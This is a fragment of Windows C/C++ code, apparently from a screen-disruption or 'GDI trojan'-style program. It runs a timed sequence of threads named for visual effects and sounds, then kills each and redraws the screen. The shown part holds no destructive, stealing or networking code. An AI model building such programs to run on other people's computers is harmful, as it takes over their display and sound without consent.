            CreateThread(0, 0, cur1, 0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, plgblt, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            TerminateThread(thread4dot1, 0);
            CloseHandle(thread4dot1);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, shader3, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread7 = CreateThread(0, 0, up, 0, 0, 0);
            HANDLE thread7dot1 = CreateThread(0, 0, triangles, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread8 = CreateThread(0, 0, shader4, 0, 0, 0);
            sound8();
            Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread9 = CreateThread(0, 0, shader5, 0, 0, 0);
            sound9();
            Sleep(30000);
        }
    }
}